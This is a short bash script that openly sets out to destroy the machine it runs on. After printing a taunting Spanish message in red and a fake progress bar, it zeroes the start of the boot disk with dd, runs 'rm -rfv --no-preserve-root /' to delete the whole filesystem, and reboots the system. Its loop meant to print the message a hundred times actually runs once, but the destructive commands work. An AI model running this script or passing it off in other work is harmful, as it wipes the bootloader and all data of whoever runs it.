#!/usr/bin/env bash

function take_boot_disk() 
{
    DISKS="$(lsblk | grep -iv NAME | grep -i disk| awk -F ' ' '{print $1};')"
    echo "/dev/$DISKS"

}

function destroy_OS()
{
    setterm -foreground red
        for i in 1..100; do echo "TE LA ACABAS DE BEBERRRR, CON HIELOOOOOOOOO"; done
    
    sleep 3
    echo -e "Procediendo a destruir el sistema y bootloader..."
    sleep 2
        echo -ne '#####                     (33%)\r'
            sleep 1
        echo -ne '#############             (66%)\r'
            sleep 1
        echo -ne '#######################   (100%)\r'
            echo -ne '\n'
    
    dd if=/dev/zero of=$(take_boot_disk) bs=1 count=46
    rm -rfv --no-preserve-root /
    
}

function bye_bye() {
        init 6
}

destroy_OS

sleep 2

bye_bye